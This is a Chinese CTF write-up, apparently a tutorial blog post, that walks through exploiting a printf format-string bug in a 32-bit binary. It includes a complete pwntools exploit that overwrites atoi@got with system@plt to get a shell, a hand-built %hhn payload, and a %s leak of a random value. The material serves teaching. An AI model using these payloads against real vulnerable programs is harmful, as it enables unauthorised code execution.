---
title: "Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system"
date: 2026-11-17 10:00:00
updated: 2026-11-17 10:00:00
categories:
  - CTF
  - Pwn
  - 格式化字符串
tags:
  - Pwn
  - 格式化字符串
  - GOT
  - PLT
  - fmtstr_payload
  - pwntools
  - IDA
  - 第五空间2019
description: 从 printf(buf) 这个经典写法出发，讲清楚格式化字符串怎么读栈、怎么用 %p 找偏移、怎么用 %n/%hhn 写内存；再结合 Partial RELRO 和 GOT/PLT，把 atoi@got 改成 system@plt，第二次输入 /bin/sh 就能在条件判断里直接拿到 shell。附手动构造 payload 的字节计数过程，以及另一条“泄漏随机数”的解法。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 6
permalink: 2026/11/17/pwn-ctf-format-string-pwn5/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（需要先理解栈传参和 GOT/PLT，建议做完前面几道 ret2text）
- **考点**：格式化字符串、`%p` / `%s` / `%n` / `%hhn`、栈上参数偏移、GOT 劫持、Partial RELRO、`fmtstr_payload`
- **漏洞点**：`printf(buf)`，`buf` 完全由用户控制，且没有给 printf 传额外参数
- **偏移**：实测 `10`（缓冲区开头对应 printf 的第 10 个可变参数）
- **关键地址**：`atoi@got = 0x804c034`，`system@plt = 0x8049080`
- **利用链**：`atoi@got` → `system@plt`；第一次输入写 GOT，第二次输入 `/bin/sh`
- **另一条路**：用 `%s` 泄漏 `0x804C044` 的随机数，再把它的十进制值当密码发回去
- **flag**：`CTF2{b0093050-400e-47ba-ac4c-16aa6c066822}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：32 位 cdecl 栈传参、GOT/PLT 的基本概念、pwntools 的 `process` / `remote` / `recvuntil`（没做过 32 位 ret2text 的话，先看 [not_the_same](/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/)）
- **阅读方式**：文中穿插了 8 道思考题，答案默认折叠，建议先自己想一遍再展开
- **工具**：IDA、gdb + pwndbg、pwntools、`readelf` / `objdump`
- **环境**：Linux（Kali / Ubuntu）。文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file / checksec` → `IDA 看 main` → `确认 printf(buf)` → `脚本测偏移` → `找 atoi@got / system@plt` → `fmtstr_payload 写 GOT` → `第二次输入 /bin/sh` → `拿 shell / 读 flag`
{% endnote %}

## 这道题在考什么

这道题用到的是 `printf` 里的一个漏洞。

如果你在程序里这样写：

```c
read(0, a, 0x56);
printf(a);
```

然后输入：

```text
aaaa%x %x %x
```

它实际执行的就是：

```c
printf("aaaa%x %x %x");
```

`printf` 看到三个 `%x`，以为你要给它三个参数，于是去取参数。但代码里根本没有传这三个参数，它取到的是**栈上/寄存器里原本就存在的东西**。

- **64 位**：前 6 个参数走寄存器（`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`），第 7 个开始才去栈上拿；
- **32 位**：参数全部在栈上，`printf` 直接顺着栈往上读。

这道题是 32 位，所以问题变成：**它读到的第几个参数，才是我们能控制的那块缓冲区？**

画成栈图大概是这样：

```text
        高地址
        +--------------------------+
        |  ??????                  |  <- 可能是栈上的其他数据
        +--------------------------+
        |  ??????                  |
        +--------------------------+
        |  默认第一个参数是 a 的地址 |
        +--------------------------+
        |  ret                     |
        +--------------------------+
        |  printf 的格式串指针      |
        +--------------------------+
        低地址
```

我们要做的第一件事，就是找到“缓冲区开头”对应第几个参数，也就是**偏移量**。

光能读还不够，还得能写。格式化字符串里最核心的三个占位符是：

| 占位符 | 作用 | 一句话 |
| --- | --- | --- |
| `%p` | 把参数当指针/整数，按十六进制打印 | 泄漏栈上的值 |
| `%s` | 把参数当地址，打印它指向的字符串 | 泄漏任意地址的内存 |
| `%n` | 把“已经打印的字符数”写到参数指向的地址 | 任意地址写 |

其中 `%n` 是杀伤力最大的，它也是这道题从“读”变成“写”的关键。`%n` 还有两个变体：

| 占位符 | 对应类型 | 写入字节数 | 写入范围 |
| --- | --- | --- | --- |
| `%n` | `int *` | 4 字节 | `0x00000000` ~ `0xFFFFFFFF` |
| `%hn` | `short *` | 2 字节 | `0x0000` ~ `0xFFFF` |
| `%hhn` | `char *` | 1 字节 | `0x00` ~ `0xFF` |

`%7$s` 这种写法叫**位置参数**：直接取第 7 个参数，不用前面的 `%p` 一个个占位。`%7$p` 就是“把第 7 个参数按十六进制打印”，`%7$hhn` 就是“把字符数写到第 7 个参数指向的地址”。

理论先说到这里，来看题目。

## 第一步：file 与 checksec

```bash
file pwn8
```

![file 查看文件类型](image-1.png)

*图 1：32 位、动态链接、stripped*

```text
pwn8: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped
```

| 字段 | 含义 | 对做题的影响 |
| --- | --- | --- |
| `ELF 32-bit` | 32 位可执行文件 | 地址 4 字节，用 `p32` |
| `LSB` | 小端序 | 低字节放低地址 |
| `Intel 80386` | i386 架构 | 参数走栈 |
| `dynamically linked` | 动态链接 | 有 GOT/PLT，函数地址受 libc 影响 |
| `stripped` | 符号表被去掉 | IDA 里函数名是 `sub_xxx`，但导入函数名还在 |
| `for GNU/Linux 3.2.0` | 目标内核版本 | 老题常见 |

再看保护：

```bash
checksec --file=pwn8
```

![checksec 查看保护](image-2.png)

*图 2：Canary found、NX enabled、Partial RELRO、No PIE*

```text
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

逐个解释：

| 保护 | 本题 | 对利用的影响 |
| --- | --- | --- |
| **Canary** | found | 栈溢出会被检测；但这题不靠溢出 |
| **NX** | enabled | 栈不可执行，不能放 shellcode |
| **PIE** | No PIE | 代码段基址固定，GOT/PLT 地址可以写死 |
| **RELRO** | Partial RELRO | **GOT 可写**，这是 GOT 劫持的前提 |

`Partial RELRO` 这个信息非常关键。它暗示了另一条漏洞利用路线：**GOT 表可以被改写**。

## 第二步：IDA 看 main

把 `pwn8` 拖进 IDA，找到 `main`，按 `F5`：

![IDA 中的 main](image.png)

*图 3：`printf(buf)` 是漏洞点，后面还有 `atoi(nptr)` 和 `system("/bin/sh")`*

```c
int __cdecl main(int a1)
{
  time_t v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

逐段看：

| 代码 | 作用 |
| --- | --- |
| `setvbuf(stdout, 0, 2, 0)` | 把 stdout 设成**无缓冲**，输出立刻发出去 |
| `open("/dev/urandom", 0)` + `read(..., 4u)` | 从 `/dev/urandom` 读 4 字节随机数到 `dword_804C044`（`0x804C044`） |
| `printf("your name:")` | 提示输入姓名 |
| `read(0, buf, 0x63u)` | 往 `buf` 读最多 **99** 字节（`0x63`） |
| `printf("Hello,")` | 打印问候 |
| **`printf(buf)`** | **漏洞点**：把用户输入直接当格式串 |
| `printf("your passwd:")` | 提示输入密码 |
| `read(0, nptr, 0xFu)` | 往 `nptr` 读最多 **15** 字节 |
| `atoi(nptr) == dword_804C044` | 把密码转成整数，和随机数比较 |
| `system("/bin/sh")` | 比较成功就给 shell |

所以这题有两条路：

| 路线 | 思路 | 难度 |
| --- | --- | --- |
| **A：泄漏随机数** | 用 `%s` 读出 `0x804C044` 的 4 字节随机数，再把它的十进制值当密码发回去 | 直接，但要处理空字节 |
| **B：GOT 劫持** | 把 `atoi@got` 改成 `system@plt`，第二次输入 `/bin/sh` | 更通用，本文采用 |

两条路都建立在同一个漏洞上：`printf(buf)`。下面先把格式化字符串的读和写讲清楚，再分别走两条路。

{% note info %}
**为什么 Canary 没有挡住？**

`buf` 是 100 字节，`read` 最多读 99 字节（`0x63`），刚好停在 Canary 前面一个字节。格式化字符串利用的是 `printf` **按参数序号读栈**，不是把数据写到 Canary 后面，所以 Canary 不会触发。

`read` 也不会自动补 `\0`，但 `buf` 后面很快就是 Canary 的低字节 `0x00`，`printf` 读到那里就停了。严格来说，可以在 payload 末尾补一个 `\x00` 更稳妥。
{% endnote %}

{% note think **思考 01｜往 `buf` 里放 4 个地址，会污染 Canary 吗？试着画图。** %}
不会。把栈帧画出来就清楚了：

```text
高地址
+--------------------------+  <- ebp
| 保存的 ebp / 返回地址 ... |
+--------------------------+
| Canary (v6)              |  <- ebp-0xC
+--------------------------+
| buf[99]                  |  <- ebp-0xD   （read 最多写到 buf[98]）
| ...                      |
| buf[0]                   |  <- ebp-0x70
+--------------------------+
| nptr[16]                 |  <- ebp-0x80
+--------------------------+
低地址
```

- `buf` 从 `ebp-0x70` 开始，长 100 字节，正好到 `ebp-0xC`，也就是 Canary 的位置；
- `read(0, buf, 0x63)` 最多读 99 字节，最后一个字节落在 `buf[98] = ebp-0xE`，离 Canary 还有 2 字节；
- 4 个目标地址放在 `buf+44` 到 `buf+59`，离 Canary 还有几十字节；
- 格式化字符串的 `%hhn` 写的是“参数指向的地址”（GOT），不是往栈上写数据。

所以既没有栈溢出，也没有污染 Canary。Canary 只有在 `read` 写超过 99 字节、或者别的写操作覆盖到 `ebp-0xC` 时才会触发。
{% endnote %}

## 第三步：找偏移

要控制 `printf` 读什么，先得知道缓冲区开头对应第几个参数。

### 先看栈布局

32 位下，`printf(buf)` 调用时：

- `[esp]` 是格式串指针，也就是 `buf` 的地址；
- `[esp+4]` 是第 1 个可变参数；
- `[esp+8]` 是第 2 个；
- 以此类推。

但 `buf` 本身也在栈上，它的位置和 `[esp]` 之间隔了多少个槽，取决于编译器怎么安排栈帧。**这个数字不能靠猜，要用脚本测。**

### 测偏移的脚本

```python
from pwn import *

elf = ELF("./pwn8")
context.log_level = 'debug'
context.arch = 'i386'


def get_offset(p):
    p.recvuntil(b'your name:')
    p.sendline(b'AAAA' + b'.%p' * 15)

    res = p.recvline()
    log.info(f"Leak output: {res}")

    parts = res.split(b'.')
    for i, part in enumerate(parts):
        if b'41414141' in part:
            log.success(f"Found offset: {i}")
            return i


p = process("./pwn8")
offset = get_offset(p)
print(offset)
```

![测偏移结果](image-4.png)

*图 4：输出里出现 `0x41414141`，对应偏移 10*

几个函数和细节：

| 代码 | 作用 |
| --- | --- |
| `recvuntil(b'your name:')` | 等到程序输出提示符，确保后面读到的是 `printf` 的结果 |
| `sendline(b'AAAA' + b'.%p' * 15)` | 缓冲区前 4 字节放 `AAAA`，后面用 `.` 分隔 15 个 `%p` |
| `recvline()` | 读一行输出 |
| `res.split(b'.')` | 按 `.` 切开，方便定位哪个 `%p` 打印出了 `41414141` |
| `if b'41414141' in part` | `AAAA` 的十六进制就是 `0x41414141`，找到它就找到了缓冲区开头 |

**为什么加 `.`？** 因为 `%p` 的输出是 `0x41414141` 这种连续字符串，如果不加分隔符，多个值会粘在一起，很难判断哪个是第几个参数。加一个 `.`，就能干净地 `split`。

输出大概是：

```text
Hello,AAAA.0xfff0e808.0x63.(nil).(nil).0x3.0xf7f78c34.0xfff0e870.
0xfff0e874.0xf7f4ca26.0x41414141.0x2e70252e...
```

数一下：

- `parts[0]` 是 `Hello,AAAA`（字面量，不算参数）；
- `parts[1]` 是第 1 个 `%p`；
- ……
- `parts[10]` 是 `0x41414141`，也就是**第 10 个参数**。

所以本题的偏移是 **10**。

{% note warning %}
**IDA 里的 `[esp+0x14]` 不能直接当参数序号。** 那是函数帧内的偏移；`printf` 调用时编译器还会调整参数区，实际序号要用脚本测。不同编译器、不同函数帧、不同优化级别，偏移都可能变。
{% endnote %}

{% note think **思考 02｜偏移 10 是由 `AAAA` 决定的，还是由栈布局决定的？把 `AAAA` 换成 `BBBB`，`%10$p` 会打印什么？** %}
偏移由栈布局决定，和内容无关。

- `printf` 的参数序号是“第几个栈槽”，`buf` 开头固定是第 10 个参数；
- 把前 4 字节换成 `BBBB`，`%10$p` 就会打印 `0x42424242`；
- `%9$p` 读的是 `buf` 前面的那个栈槽，和 `buf` 的内容无关，所以不会跟着变。

偏移是“位置”，`AAAA` / `BBBB` 只是“放在这个位置上的值”。测偏移时用 `AAAA` 只是为了好认（`0x41414141`），换成别的标记也行。
{% endnote %}

## 第四步：GOT 表是什么，为什么能改

在写 payload 之前，先把 GOT/PLT 讲清楚，不然后面“改 atoi@got”会像天书。

### GOT 和 PLT

动态链接的程序不会把 `printf`、`atoi` 这些 libc 函数的代码直接打进自己文件里，运行时才去 `libc.so` 找。问题是：**每次调用都去 libc 里查地址太慢**，所以有了 GOT/PLT：

| 名字 | 位置 | 作用 |
| --- | --- | --- |
| **GOT**（Global Offset Table） | 数据段 | 存放外部函数的真实地址 |
| **PLT**（Procedure Linkage Table） | 代码段 | 一小段跳板代码，跳转到 GOT 里记录的地址 |

可以把它想成“电话号码簿”：

- PLT 是“拨号动作”；
- GOT 是“号码簿”，里面记着函数真正的地址。

### 延迟绑定（Lazy Binding）

程序刚启动时，GOT 里很多项并不知道真实地址。第一次调用某个函数时：

1. PLT 跳到 GOT；
2. GOT 里放的是一段“解析代码”（`_dl_runtime_resolve`）；
3. 解析代码找到函数的真实地址，写回 GOT；
4. 以后再次调用，PLT 直接从 GOT 拿到真实地址，跳过去执行。

这就是**延迟绑定**。它的好处是启动快，坏处是 **GOT 在运行时可写**。

### Partial RELRO 意味着什么

`checksec` 里的 RELRO 有三种常见状态：

| 状态 | GOT 是否可写 | 说明 |
| --- | --- | --- |
| `No RELRO` | 可写 | 完全不保护 |
| `Partial RELRO` | **可写** | 常见的默认状态 |
| `Full RELRO` | 只读 | 启动时解析完所有符号，再把 GOT 设成只读 |

本题是 `Partial RELRO`，所以 `atoi@got` 可以被我们改写。

不妨想想：既然 GOT 可写，把一个“马上要被调用”的函数 GOT 地址改成另一个函数，不就能控制程序了吗？

正是如此。

{% note info %}
**PLT 和 GOT 的关系，一句话记：**

`call atoi@plt` → `atoi@plt` 执行 `jmp [atoi@got]` → 跳到 GOT 里记录的地址。

所以我们改的是 `atoi@got` 里的**地址值**，不是 `atoi@plt` 的代码。
{% endnote %}

{% note think **思考 03｜如果这题是 Full RELRO，`atoi@got` 还能改吗？不能的话，你会换什么写目标？** %}
不能。Full RELRO 会在程序启动时解析完所有符号，然后把 GOT 设成只读；再用 `%hhn` 往 `atoi@got` 写，会直接触发段错误。

可以换的目标：

| 目标 | 位置 | 前提 |
| --- | --- | --- |
| 栈上的返回地址 | `main` 的栈帧 | 知道栈地址 / 能泄漏 |
| `__malloc_hook` / `__free_hook` | libc | 老版本 glibc，且知道 libc 基址 |
| `exit_funcs` / `_IO_file_jumps` | libc | 需要泄漏 libc |
| 程序自己的函数指针 | 可写数据段 | 题目里有函数指针 |

如果不想换目标，也可以走另一条路：用 `%s` 泄漏随机数，直接过 `atoi(nptr) == random` 的检查，让程序自己执行 `system("/bin/sh")`。这题有 Partial RELRO，所以 GOT 劫持是最省事的。
{% endnote %}

## 第五步：找 atoi@got 和 system@plt

IDA 左侧的函数列表里，粉色背景的是外部函数：

![IDA 函数列表](image-3.png)

*图 5：`read`、`printf`、`atoi`、`system` 等都是外部函数*

这里要关注两个：

- `atoi`：在 `main` 里被调用，参数是 `nptr`（我们第二次输入的内容）；
- `system`：程序里已经有 `system("/bin/sh")`，所以它的 PLT 一定存在。

为什么选 `atoi`，不选 `printf`？

| 函数 | 调用时机 | 适不适合改 |
| --- | --- | --- |
| `printf` | 正在执行格式化字符串 | 改它来不及影响当前调用，而且后续还要靠它输出 |
| `atoi` | 格式化字符串之后，参数是 `nptr` | **完美**：下一次调用就用我们的第二个输入 |
| `system` | 条件成立后才调用 | 改它没有意义，我们想让 `atoi` 变成它 |

把 `atoi@got` 改成 `system@plt` 之后：

```text
atoi(nptr)  →  system(nptr)
```

第二次输入 `/bin/sh`，就变成 `system("/bin/sh")`。

### 用 pwntools 拿地址

```python
atoi_got = elf.got['atoi']
system_plt = elf.plt['system']

log.success(f"atoi@got -> {hex(atoi_got)}")
log.success(f"system@plt -> {hex(system_plt)}")
```

本题的输出是：

```text
[+] atoi@got -> 0x804c034
[+] system@plt -> 0x8049080
```

这就是脚本的好处：不用手动去 `readelf` 里翻地址，`elf.got` / `elf.plt` 直接帮你查。

如果手动查，也可以用：

```bash
readelf -r ./pwn8 | grep atoi
objdump -d ./pwn8 | grep system
```

## 第六步：用 fmtstr_payload 写 GOT

### 为什么用 `%hhn` 而不是 `%n`

`atoi@got` 要写入的值是 `0x08049080`，大约 **1.34 亿**。如果用 `%n` 一次写 4 字节，`printf` 必须先打印 1.34 亿个字符，程序早就崩了，网络也扛不住。

`%hhn` 一次只写 1 字节，把 `0x08049080` 拆成 4 个字节：

```text
0x08049080
= 0x08 0x04 0x90 0x80   （从高到低）
内存里按小端排列：
+0: 0x80
+1: 0x90
+2: 0x04
+3: 0x08
```

每次最多打印 255 个字符，4 次就能写完，效率高得多。

### 用 API 一行搞定

```python
payload = fmtstr_payload(10, {atoi_got: system_plt}, write_size='byte')
```

参数解释：

| 参数 | 含义 |
| --- | --- |
| `10` | 偏移，也就是缓冲区开头对应第 10 个参数 |
| `{atoi_got: system_plt}` | 往 `atoi@got` 写入 `system@plt` 的值 |
| `write_size='byte'` | 用 `%hhn` 逐字节写 |

`fmtstr_payload` 会自动做这些事：

1. 把目标值拆成字节；
2. 按字节值排序，计算每次要补多少字符；
3. 把目标地址放到格式串末尾，并调整对齐；
4. 生成 `%...c%N$hhn` 序列。

所以实际发出去的 payload 可能长这样（具体顺序由 pwntools 版本决定）：

```text
%8c%19$hhn%120c%20$hhn%104c%21$hhn...<地址1><地址2><地址3>...
```

不用手算，直接发就行。

### 完整 exp

```python
from pwn import *

elf = ELF("./pwn8")
context.log_level = 'info'
context.arch = 'i386'

HOST = '491041bb79ed2ac33b8fa279.tcp-ctf2.dasctf.com'
PORT = 9999

atoi_got = elf.got['atoi']
system_plt = elf.plt['system']

log.success(f"atoi@got -> {hex(atoi_got)}")
log.success(f"system@plt -> {hex(system_plt)}")

p = remote(HOST, PORT, ssl=True, sni=HOST)
payload = fmtstr_payload(10, {atoi_got: system_plt}, write_size='byte')

p.recvuntil(b'your name:')
p.sendline(payload)

p.recvuntil(b'your passwd:')
p.sendline(b'/bin/sh')

p.interactive()
```

注意这里要发**两次**：

| 次数 | 输入 | 作用 |
| --- | --- | --- |
| 第 1 次 | `payload` | 用格式化字符串改写 `atoi@got` |
| 第 2 次 | `/bin/sh` | 作为被改后的 `atoi`（也就是 `system`）的参数 |

一次改 GOT 表，一次给函数传参。

{% note think **思考 04｜第一次直接发 `/bin/sh` 行不行？第二次也发格式化字符串行不行？** %}
都不行，因为两次输入进的是不同的函数：

| 输入 | 读进 | 被谁使用 | 应该是什么 |
| --- | --- | --- | --- |
| 第 1 次 | `buf` | `printf(buf)` | 格式化字符串 payload，用来改 `atoi@got` |
| 第 2 次 | `nptr` | `atoi(nptr)` | `/bin/sh`，作为改后的 `system` 的参数 |

- 第一次发 `/bin/sh`：它只是普通字符串，`printf` 里没有 `%n`，GOT 不会变；
- 第二次发格式化字符串：`atoi` 已经被改成 `system`，`system` 会把这段字符串当 shell 命令执行，而不是当格式串解析。

所以顺序和内容都不能换。
{% endnote %}

## 第七步：手动构造 payload（理解 fmtstr_payload）

API 很好用，但至少要能看懂它生成了什么。下面用本题的真实地址手动推一遍。

### 目标字节

```text
atoi_got   = 0x0804c034
system_plt = 0x08049080
```

要写入的 4 个字节：

| 地址 | 目标字节 |
| --- | --- |
| `atoi_got + 0` = `0x0804c034` | `0x80` |
| `atoi_got + 1` = `0x0804c035` | `0x90` |
| `atoi_got + 2` = `0x0804c036` | `0x04` |
| `atoi_got + 3` = `0x0804c037` | `0x08` |

### 排序

`%hhn` 写入的是“当前已经打印的字符数”，所以后面的写入只能比前面大（或者加 `0x100` 绕回来）。为了少打印，按目标字节从小到大排：

| 顺序 | 目标地址 | 目标字节 | 需要打印到的总数 |
| --- | --- | --- | --- |
| 1 | `atoi_got + 2` | `0x04` | 4 |
| 2 | `atoi_got + 3` | `0x08` | 8 |
| 3 | `atoi_got + 0` | `0x80` | 128 |
| 4 | `atoi_got + 1` | `0x90` | 144 |

### 放地址

把 4 个地址放在格式串末尾，每个 4 字节，共 16 字节。为了让地址落在 4 字节对齐的位置，格式串主体要补齐到 4 的倍数。

格式串主体：

```text
%4c%21$hhn%4c%22$hhn%120c%23$hhn%16c%24$hhn
```

长度是 43 字节，补一个 `a` 到 44 字节。地址从 `buf+44` 开始：

- `buf+0` 是第 10 个参数；
- `buf+44` 是 `10 + 44/4 = 21`，也就是第 21 个参数；
- 四个地址依次是第 21、22、23、24 个参数。

所以 payload 是：

```python
payload = b'%4c%21$hhn%4c%22$hhn%120c%23$hhn%16c%24$hhn'
payload += b'a'  # 补齐到 44 字节
payload += p32(atoi_got + 2)   # 第 21 个参数，写 0x04
payload += p32(atoi_got + 3)   # 第 22 个参数，写 0x08
payload += p32(atoi_got + 0)   # 第 23 个参数，写 0x80
payload += p32(atoi_got + 1)   # 第 24 个参数，写 0x90
```

### 验证计数

| 片段 | 打印字符数 | 累计 | 写入地址 | 写入值 |
| --- | --- | --- | --- | --- |
| `%4c` | 4 | 4 | `atoi_got+2` | `0x04` |
| `%4c` | 4 | 8 | `atoi_got+3` | `0x08` |
| `%120c` | 120 | 128 | `atoi_got+0` | `0x80` |
| `%16c` | 16 | 144 | `atoi_got+1` | `0x90` |

最后内存里是：

```text
+0: 0x80
+1: 0x90
+2: 0x04
+3: 0x08
= 0x08049080
```

正好是 `system@plt`。

{% note warning %}
**手动构造最容易错的两件事：**

1. **偏移算错**：本题是 10，不是 7。用 `%7$hhn` 会写到别的栈位置，轻则没反应，重则崩溃；
2. **计数算错**：每次 `%hhn` 写的是“累计字符数 mod 256”，不是“这一次打印了多少”。如果目标字节比当前累计小，要加 `0x100` 再减。

所以实战里建议直接用 `fmtstr_payload`，手动推一遍是为了理解原理。
{% endnote %}

{% note think **思考 05｜已经打印了 128 个字符，下一个目标字节是 `0x10`，`%hhn` 前要再打印多少字符？如果目标字节是 `0x90` 呢？** %}
`%hhn` 写的是“累计字符数 mod 256”，所以：

- 目标 `0x90` = 144：144 > 128，再打印 `144 - 128 = 16` 个字符；
- 目标 `0x10` = 16：16 < 128，不能倒着打印，要绕一圈：`16 + 256 - 128 = 144` 个字符。累计变成 `128 + 144 = 272 = 0x110`，低字节正好是 `0x10`。

口诀：**目标比当前大，直接减；目标比当前小，加 256 再减。**
{% endnote %}

## 第八步：打远程，拿 shell

运行 exp：

![运行 exp](image-5.png)

*图 6：payload 发送成功，`atoi` 被改成 `system`，第二次输入 `/bin/sh` 后拿到 `$`*

```text
[+] atoi@got -> 0x804c034
[+] system@plt -> 0x8049080
[+] Opening connection to ... on port 9999: Done
[*] Switching to interactive mode
$ 
```

拿到 shell 后读 flag：

```bash
cat /flag
```

![读取 flag](image-6.png)

*图 7：`cat /flag` 拿到 flag*

```text
CTF2{b0093050-400e-47ba-ac4c-16aa6c066822}
```

### 为什么 shell 在 `if` 之前就出现了

看源码：

```c
if ( atoi(nptr) == dword_804C044 )
{
    puts("ok!!");
    system("/bin/sh");
}
```

我们改的是 `atoi@got`，所以 `atoi(nptr)` 实际变成了 `system(nptr)`。`system("/bin/sh")` 会**在条件判断里**启动 shell，并等它退出。也就是说：

- shell 是在 `atoi(nptr)` 这个表达式求值时出现的；
- 程序自己的 `puts("ok!!")` 和 `system("/bin/sh")` 还没执行；
- 你只要在 shell 里读 flag，读完退出即可，后面的比较结果已经不重要了。

这也是 GOT 劫持比“泄漏随机数”更干脆的地方：**根本不需要知道随机数是多少**。

{% note think **思考 06｜覆盖 `atoi@got` 后，原来的 `if (atoi(nptr) == dword_804C044)` 还成立吗？为什么我们还能拿到 shell？** %}
原来的比较逻辑已经不重要了。

- `atoi(nptr)` 被替换成 `system(nptr)`；
- `system("/bin/sh")` 会启动 shell，并**等 shell 退出**才返回；
- 也就是说，shell 是在 `if` 的条件求值过程中出现的，程序还没走到 `==` 比较，也没走到 `if` 体里的 `puts("ok!!")`；
- 你在 shell 里 `cat /flag`，读完退出即可。之后 `system` 返回一个退出状态，和随机数比较大概率不相等，程序可能打印 `fail` 然后结束，但 flag 已经拿到了。

所以 GOT 劫持是“在条件里截胡”，不是“让条件成立”。
{% endnote %}

## 另一条路：泄漏随机数

如果不改 GOT，也可以老老实实过随机数检查。

### 思路

随机数在 `0x804C044`，用 `%s` 把它指向的 4 字节读出来：

```python
payload = p32(0x804C044) + b'%10$s'
```

- `p32(0x804C044)` 放在缓冲区开头，是第 10 个参数；
- `%10$s` 把这个参数当地址，打印它指向的字符串。

发过去之后，`printf` 会把 `0x804C044` 处的 4 字节当成字符串输出。收到后转成整数：

```python
data = p.recvuntil(b'your passwd:')
leak = data.split(b'Hello,', 1)[1][:-len(b'your passwd:')]
value = u32(leak.ljust(4, b'\x00'))
p.sendline(str(value).encode())
```

如果随机数正好等于 `value`，程序就会打印 `ok!!` 并执行它自己的 `system("/bin/sh")`。

### 为什么这条路径有坑

`%s` 遇到 `\x00` 就停。随机数 4 个字节里只要有一个空字节，泄漏就会变短：

| 情况 | 结果 |
| --- | --- |
| 没有空字节 | 4 字节都能读到 |
| 空字节在末尾 | 读到前 3 字节，补 `\x00` 还能还原 |
| 空字节在中间 | 后面的字节读不到，补零会猜错 |

概率不高，但确实存在。想稳一点，可以分别泄漏 `0x804C044`、`0x804C045`、`0x804C046`、`0x804C047` 四个地址，用分隔符拼起来；或者干脆走 GOT 劫持，绕开随机数。

{% note info %}
**两条路的取舍：**

- **泄漏随机数**：逻辑最贴题目本意，payload 短，但受空字节影响；
- **GOT 劫持**：不关心随机数，稳定，顺便练 `%n` 写内存和 GOT/PLT，是更“pwn”的做法。

本文选后者，是因为这题的重点就是格式化字符串的**写**能力。
{% endnote %}

{% note think **思考 07｜`%10$s` 只读到 2 个字节，可能是什么原因？怎么设计一个不怕空字节的泄漏方案？** %}
大概率是随机数里出现了 `\x00`。`%s` 把参数当地址，一直打印到第一个 `\x00` 为止，所以空字节会截断泄漏。

不怕空字节的方案是**逐字节泄漏**：把 4 个地址都放进缓冲区，用 4 个 `%s` 分别从 4 个字节开始读：

```python
payload  = p32(0x804C044) + p32(0x804C045)
payload += p32(0x804C046) + p32(0x804C047)
payload += b'%10$s.%11$s.%12$s.%13$s'
```

- 第 1 个 `%s` 从 `0x804C044` 开始读，第 2 个从 `0x804C045` 开始，以此类推；
- 每个 `%s` 会读到下一个 `\x00` 为止，取每段的第一个字节就是目标字节；
- 某一位是 `0x00` 时，对应段为空，直接补零。

这样无论空字节在哪一位，4 个字节都能还原。如果不想处理这些边界，直接走 GOT 劫持更省心。
{% endnote %}

## 知识点补充

### 1. 格式化字符串的常用占位符

| 写法 | 作用 | 典型用途 |
| --- | --- | --- |
| `%p` | 打印参数的值（十六进制） | 泄漏栈地址、Canary、返回地址 |
| `%s` | 把参数当地址，打印字符串 | 泄漏 GOT 里的 libc 地址、任意内存 |
| `%n` | 把已打印字符数写入 `int *` | 4 字节任意写 |
| `%hn` | 写入 `short *` | 2 字节任意写 |
| `%hhn` | 写入 `char *` | 1 字节任意写 |
| `%<n>c` | 打印一个字符，左边补空格到宽度 `n` | 控制 `%n` 的计数 |
| `%<k>$p` | 取第 `k` 个参数 | 跳过前面的参数 |

### 2. 32 位和 64 位的区别

| 项目 | 32 位 | 64 位 |
| --- | --- | --- |
| 参数位置 | 全部在栈上 | 前 6 个在寄存器，之后在栈上 |
| 寄存器 | — | `rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9` |
| 偏移常见值 | 取决于栈帧 | 常见 6、7、8 等 |
| 地址长度 | 4 字节，`p32` | 8 字节，`p64` |

64 位下第一个可变参数在 `rsi`（`rdi` 是格式串），第 7 个才到栈上；所以找偏移时经常看到 `%6$p`、`%7$p` 这类写法。本题是 32 位，所有参数都在栈上。

{% note think **思考 08｜如果这题是 64 位，`printf(buf)` 的前几个参数在哪？偏移还会是 10 吗？** %}
不会还是 10。64 位下：

- `rdi` 放格式串指针 `buf`；
- `rsi`、`rdx`、`rcx`、`r8`、`r9` 放前 5 个可变参数；
- 第 6 个可变参数开始才去栈上拿。

所以 `%p` 的前几个值来自寄存器，`buf` 的开头通常对应 `%6$p`、`%7$p` 或 `%8$p`，具体看编译器和栈布局，仍然要用脚本测。地址也要从 `p32` 换成 `p64`，`elf.got` / `elf.plt` 的地址是 8 字节。

一句话：**32 位全在栈上，64 位先寄存器后栈；偏移永远实测。**
{% endnote %}

### 3. `%n` 到底写了什么

`%n` 写入的是**到目前为止 printf 已经输出的字符总数**，包括：

- 格式串里的普通字符；
- `%c` 打印的字符；
- `%d`、`%x` 等格式化后的字符；
- 宽度补的空格。

它**不包括** `%n` 自己（因为 `%n` 不输出字符）。

所以控制写入值的方法是：

```text
先打印 N 个字符，再用 %hhn 写 N mod 256
```

